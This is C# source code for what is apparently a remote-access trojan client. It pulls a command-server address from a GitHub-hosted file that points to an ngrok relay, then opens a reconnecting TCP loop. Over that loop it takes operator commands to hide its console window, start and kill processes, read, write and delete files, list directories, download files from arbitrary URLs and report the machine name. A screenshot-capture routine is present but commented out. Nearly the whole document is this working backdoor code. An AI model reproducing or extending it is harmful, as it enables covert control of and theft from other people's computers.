using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace clin;

internal class Pro
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


    static string direct_work = "C:\\";
    static string siml = "$";
    private static void Main()
    {

    A:
         
    const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const int SW_Min = 2;
        const int SW_Max = 3;
        const int SW_Norm = 4;

        string host = "127.0.0.1";
            int port = 25565;
        try {
            ShowWindow(GetConsoleWindow(), SW_SHOW);
            
            bool IsDirectoryEmpty(string path)
        {
            return !Directory.EnumerateFileSystemEntries(path).Any();
        }
        string ClientCommannds(string command, Stream stream)
            {
            Process[] allProcesses = new Process[0];
                
                string[] helper = new string[] { "screenshot", "getsynbol",$"setsynbol{siml} --synb", $"conosle{siml} --command (show, hide, min, max, norm) ", $"mv{siml} --old path{siml} --new path",$"start{siml} --command", $"kill{siml} --pid", "ps", $"nano{siml} --path{siml} --text", $"notepad{siml} --path", $"cat{siml} --path", "help", "username", $"googleopen{siml} --Uri", $"googledownload{siml} --Uri{siml} --path", "clear", $"cd{siml} --path", "cd..", $"ls or ls{siml} --path", "showcd", "l", $"mkdir{siml} --path", $"rmdir{siml} --path" };
                string requst = "null";
                string strCmdText = "null";
                string argumentCmd = "";
                string[] parse_comamnd = command.Split(siml);
                command = parse_comamnd[0];
                command = command.ToLower().Trim();
                string select_dir = "empty";
                string select_file = "empty.txt";
                int select_pid = 0;
                switch (command.Trim())
                {
                   /* case "screenshot":
                        //
                        byte[] ImageToByte(System.Drawing.Image img)
                    {
                        ImageConverter converter = new ImageConverter();
                        if (converter.ConvertTo(img, typeof(byte[])).ToString().Trim().Length > 0) {
                            return (byte[])converter.ConvertTo(img, typeof(byte[]));
                        }
                        else 
                        {
                            return new byte[0];
                        }
                    }
                        Bitmap map;
                    //get
                    // Получаем размер экрана
                    Rectangle bounds = new Rectangle(0,0,100,100);

                    // Создаем изображение нужного размера
                    using (Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb))
                    {
                        using (Graphics graphics = Graphics.FromImage(screenshot))
                        {
                            // Захватываем скриншот экрана
                            graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);

                            // Сохраняем изображение в файл
                            map = screenshot;
                        }
                    }

                    //
                    int ind = 0;
                        string text = "";
                        byte[] arr = ImageToByte(map);
                        foreach (var i in arr)
                        {
                            if (!(arr.Length - 1 == ind))
                            {
                                text += i.ToString() + ",";
                            }
                            else
                            {
                                text += i.ToString();
                            }
                            ind++;
                        }
                        //
                        break;*/
                    case "getsynbol":
                        requst = "your symbol: "+siml;
                        break;
                    case "setsynbol":
                        if (parse_comamnd.Length > 1) 
                        {
                            if (parse_comamnd[1].Trim().Length > 0) 
                            {
                                siml = parse_comamnd[1].Trim();
                            }
                        }
                        break;
                    case "mv":

                        string file1 = "empty.txt";
                        string file2 = "empty.txt";
                        if (parse_comamnd.Length > 1)
                        {
                            file1 = parse_comamnd[1];
                            if (file1.Trim().Length > 0) {
                                if (parse_comamnd.Length > 2)
                                {
                                    file2 = parse_comamnd[2];
                                    if (file2.Trim().Length > 0) 
                                    {
                                        File.Move(direct_work + file1, direct_work + file2);
                                        requst = "success move";
                                    }
                                }
                                else
                                {
                                    requst = "argument 2?";
                                }
                            }
                        }
                        else 
                        {
                            requst = "argument 1?";
                        }
                        break;
                    case "start":

                        if (parse_comamnd.Length == 2) {
                            strCmdText = parse_comamnd[1];
                            if (strCmdText.Trim().Length > 0) {
                                Process.Start(strCmdText);

                            }
                        }
                        else if (parse_comamnd.Length == 3) 
                        {
                            strCmdText = parse_comamnd[1];
                            argumentCmd = parse_comamnd[2];
                            if (strCmdText.Trim().Length > 0)
                            {
                                if (argumentCmd.Trim().Length > 0)
                                {
                                    Process.Start(strCmdText, argumentCmd);
                                }
                                else 
                                {
                                    requst = "argument 2?";
                                }
                            }
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        break;
                    case "kill":
                    if (parse_comamnd.Length>1) 
                    {
                        allProcesses = Process.GetProcesses();
                        if (int.TryParse(parse_comamnd[1], out select_pid))
                        {
                            foreach (var index in allProcesses) 
                            {
                                if (index.Id == select_pid)
                                {
                                    index.Kill();
                                    requst = "process kill";
                                }
                                else 
                                {
                                    requst = "process not found";
                                }
                            }
                        }
                        else 
                        {
                            requst = "this is pid not corect";
                        }
                    }
                    break;
                    case "ps":
                    string temp_process="";
                    allProcesses = Process.GetProcesses();
                    foreach (var index in allProcesses) 
                    {
                        temp_process += $"| Id - {index.Id}, PNaem - {index.ProcessName}, BPriority - {index.BasePriority}, Title - {index.MainWindowTitle}|\n";
                    }
                    requst = temp_process;
                    break;
                    case "": requst = "empty"; break;
                    case "help":
                        {
                            requst = "";
                            string[] array = helper;
                            foreach (string i in array)
                            {
                                requst = requst + "command - " + i + "\n";
                            }
                            break;
                        }
                    case "username":
                        requst = Environment.MachineName;
                        break;
                    case "googledownload":
                    using (WebClient client = new WebClient()) 
                    {
                        string answer3 = "empty";
                        if (parse_comamnd.Length > 1)
                        {
                            answer3 = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        if (parse_comamnd.Length > 2) {
                            if (Uri.TryCreate(answer3, UriKind.Absolute, out Uri uri))
                            {
                                client.DownloadFile(answer3, direct_work + parse_comamnd[2].Trim());
                                requst = "success";
                            }
                            else
                            {

                                requst = $"not correct Uri";
                            }
                        }
                        else 
                        {
                            requst = "argument 2?";
                        }
                    }
                        break;
                    case "googleopen":
                        {
                            string answer2 = "empty";
                            if (parse_comamnd.Length > 1)
                            {
                                answer2 = parse_comamnd[1];
                            }
                            else
                            {
                                requst = "argument 1?";
                            }


                            if (Uri.TryCreate(answer2, UriKind.Absolute, out Uri uri))
                            {
                                ProcessStartInfo psInfo = new ProcessStartInfo
                                {
                                    FileName = answer2.Trim(),
                                    UseShellExecute = true
                                };
                                Process.Start(psInfo);
                                requst = "success";
                            }
                            else
                            {

                                requst = $"|{answer2}|";
                            }


                            break;
                        }
                    case "l":
                        string temp_dir3 = "| File: ";
                        string[] files2 = Directory.GetFiles(direct_work);
                        foreach (string j in files2)
                        {
                            temp_dir3 = temp_dir3 + "# " + j + " #";
                        }
                        temp_dir3 += "\n";
                        temp_dir3 += "| Direst: ";
                        string[] directories2 = Directory.GetDirectories(direct_work);
                        foreach (string k in directories2)
                        {
                            temp_dir3 = temp_dir3 + "| " + k + " |";
                        }
                        temp_dir3 += "\n";
                        requst = temp_dir3;
                        break;
                    case "cd":

                        if (parse_comamnd.Length > 1)
                        {
                            select_dir = parse_comamnd[1];
                        }

                        if (Directory.Exists(direct_work + select_dir))
                        {
                            requst = "open dir";
                            direct_work += select_dir+"\\";
                        }
                        else
                        {
                            requst = "not dir";
                        }
                        if (Directory.Exists(select_dir))
                        {
                            direct_work = select_dir + "\\";
                            requst = "open dir";
                        }

                        break;
                    case "ls":
                        {
                            string temp_dir = "";
                            if (parse_comamnd.Length > 1) 
                            {
                                temp_dir = "# File: ";

                                if (parse_comamnd[1].Trim().Length > 1) {
                                    if (Directory.Exists(direct_work + parse_comamnd[1] + "\\")) {
                                        string[] files = Directory.GetFiles(direct_work + parse_comamnd[1] + "\\");
                                        foreach (string j in files)
                                        {
                                            temp_dir = temp_dir + "# " + j.Split("\\")[j.Split("\\").Length - 1] + " #";
                                        }
                                        temp_dir += "\n";
                                        temp_dir += "| Direst: ";
                                        string[] directories = Directory.GetDirectories(direct_work + parse_comamnd[1] + "\\");
                                        foreach (string k in directories)
                                        {
                                            temp_dir = temp_dir + "| " + k.Split("\\")[k.Split("\\").Length - 1] + " |";
                                        }
                                        temp_dir += "\n";
                                    } 
                                }
                                
                            }
                            else {
                                temp_dir = "# File: ";
                                string[] files = Directory.GetFiles(direct_work);
                                foreach (string j in files)
                                {
                                    temp_dir = temp_dir + "# " + j.Split("\\")[j.Split("\\").Length - 1] + " #";
                                }
                                temp_dir += "\n";
                                temp_dir += "| Direst: ";
                                string[] directories = Directory.GetDirectories(direct_work);
                                foreach (string k in directories)
                                {
                                    temp_dir = temp_dir + "| " + k.Split("\\")[k.Split("\\").Length - 1] + " |";
                                }
                                temp_dir += "\n";
                               
                            } 
                            requst = temp_dir;
                            break;
                        }
                    case "cd..":
                        string temp_dir2 = "";
                        string[] parse_sh = direct_work.Split("\\");
                        if (direct_work != "C:\\")
                        {
                            if (parse_sh.Length > 0)
                            {
                                for (int i = 0; i < parse_sh.Length - 2; i++)
                                {
                                    if (i < parse_sh.Length)
                                    {
                                        temp_dir2 += $"{parse_sh[i]}\\";
                                    }
                                }
                                direct_work = temp_dir2;
                                requst = temp_dir2;
                            }
                        }
                        break;
                        break;
                    case "console":
                        if (parse_comamnd.Length > 1) 
                        {
                            if (parse_comamnd[1].Trim().Length > 0) 
                            {
                                string command_console = parse_comamnd[1];
                                switch (command_console) 
                                {
                                    case "show":
                                        ShowWindow(GetConsoleWindow(),SW_SHOW);
                                        requst = "show succes";
                                        break;
                                    case "hide":
                                        ShowWindow(GetConsoleWindow(), SW_HIDE);
                                        requst = "hide succes";
                                        break;
                                    case "min":
                                        ShowWindow(GetConsoleWindow(), SW_Min);
                                        requst = "min succes";
                                        break;
                                    case "max":
                                        ShowWindow(GetConsoleWindow(), SW_Max);
                                        requst = "max succes";
                                        break;
                                    case "norm":
                                        ShowWindow(GetConsoleWindow(), SW_Norm);
                                        requst = "norm succes";
                                        break;
                                    default: requst = "command not found"; break;
                                }
                            }
                        }
                        break;
                
                    case "showcd":
                        requst = direct_work;
                        break;
                    case "test":
                        requst = "test";
                        break;
                    case "mkdir":
                        if (parse_comamnd.Length > 1)
                        {
                            select_dir = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                    if (!Directory.Exists(direct_work + select_dir))
                    {
                        if (select_dir.Trim().Length > 0)
                        {
                            Directory.CreateDirectory($"{direct_work}{select_dir.Trim()}\\").Create();
                            requst = "direct created";
                        }
                        else 
                        {
                            requst = "direct empty";
                        }
                    }
                        break;
                    case "rmdir":
                        if (parse_comamnd.Length > 1)
                        {
                            select_dir = parse_comamnd[1];
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                    if (Directory.Exists(direct_work+select_dir)) {
                        if (select_dir.Trim().Length > 0) {
                            if (IsDirectoryEmpty(direct_work + select_dir.Trim() + "\\"))
                            {
                                Directory.Delete($"{direct_work}{select_dir.Trim()}\\"); 
                                requst = "direct remove";
                            }
                            else 
                            {
                                requst = "the folder is not empty";
                            }
                           
                        }
                    }
                        break;
                    case "notepad":
                        if (parse_comamnd.Length > 1)
                        {
                            select_file = parse_comamnd[1].Trim(); 
                            if (File.Exists(direct_work + select_file))
                            {
                             requst = "open file";
                             Process.Start("notepad.exe", direct_work + select_file);
                               
                            }
                            else
                            {
                                requst = "file not exists";
                            }
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                       
                        
                        break;
                    case "cat":
                        if (parse_comamnd.Length > 0)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        if (File.Exists(direct_work + select_file))
                        {
                            string file = File.ReadAllText(direct_work + select_file);
                            if (file?.Trim().Length > 0 && file != null)
                            {
                                requst = $"\n############################\n{file}\n############################\n";
                            }
                            else
                            {
                                requst = "file empty";
                            }
                        }
                        break;
                    case "nano":
                        if (parse_comamnd.Length > 1)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                        else
                        {
                            requst = "argument 1?";
                        }
                        
                        if (parse_comamnd.Length > 2)
                        {
                        if (File.Exists(direct_work + select_file))
                        {
                            File.WriteAllText(direct_work + select_file, parse_comamnd[2].Trim());
                            requst = "save text";
                        }
                        else 
                        {
                          
                            if (Directory.Exists(direct_work)) {

                                if (select_file.Trim().Length > 0) {
                                    File.Create(direct_work + select_file).Close();

                                    File.WriteAllText(direct_work + select_file, parse_comamnd[2].Trim());
                                }
                            }
                            requst = "save text";
                        }
                        }
                        else
                        {
                            requst = "argument 2?";
                        }
                        break;
                    case "rm":
                        if (parse_comamnd.Length > 1)
                        {
                            select_file = parse_comamnd[1].Trim();
                        }
                    if (File.Exists(direct_work + select_file))
                    {
                        if (select_file.Trim().Length > 0) {
                            File.Delete(direct_work + select_file);
                            requst = "remove text";
                        }
                    }

                    break;
                    default:
                        requst = "Client: the command was not found"; break;


                }
                return requst;
            }
            string Read(Stream stream)
            {
                string requst = "nullread";
                byte[] buffer = new byte[1024];
                int size = stream.Read(buffer, 0, buffer.Length);
                requst = Encoding.UTF8.GetString(buffer, 0, size);
                return requst;
            }
            void Write(Stream stream, string text)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                stream.Write(buffer, 0, buffer.Length);
                stream.Flush();
            }
            using (WebClient client = new WebClient())
            {
                string file = client.DownloadString("https://raw.githubusercontent.com/pag6666/ngrok_file/main/ngrok_server_connection");
                string[] arr = file.Split(':');
                host = arr[0];
                port = int.Parse(arr[1]);

            }
           
            ///////////////////////////////////
            Console.WriteLine($"host = {host} port = {port}");
            using (TcpClient client = new TcpClient(host, port))
            {
                using Stream stream = client.GetStream();
                while (true)
                {
                    string order = Read(stream);
                    if (order!="test") {
                        Console.WriteLine(order);
                    }
                    string answer = "null answer";
                    if (order.Trim().Length > 0 && order != null)
                    {
                        answer = ClientCommannds(order, stream);
                    }
                    Write(stream, answer);
                }
            }

            }
        catch(Exception e)
        {
            Console.WriteLine(e.Message);
            Thread.Sleep(5000);
            goto A;
        }

    }
}
